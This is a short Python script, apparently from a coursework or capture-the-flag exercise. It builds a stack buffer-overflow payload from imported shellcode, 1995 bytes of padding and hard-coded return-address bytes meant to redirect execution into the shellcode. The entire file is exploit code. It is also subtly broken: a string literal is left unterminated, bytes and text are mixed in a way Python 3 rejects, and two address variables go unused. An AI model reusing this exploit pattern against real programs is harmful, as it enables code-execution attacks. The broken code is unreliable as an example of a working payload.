import sys
from shellcode import shellcode

addr = 0xbffef288.to_bytes(4, "little")
ret_addr= 0xbffefa9c.to_bytes(4,"little")
sys.stdout.buffer.write(shellcode+"a"*1995+"\x68"+"\x69"+"\xfe"+"\xbf"+"\x7c"+"\x71"+"\xfe"+"\xbf);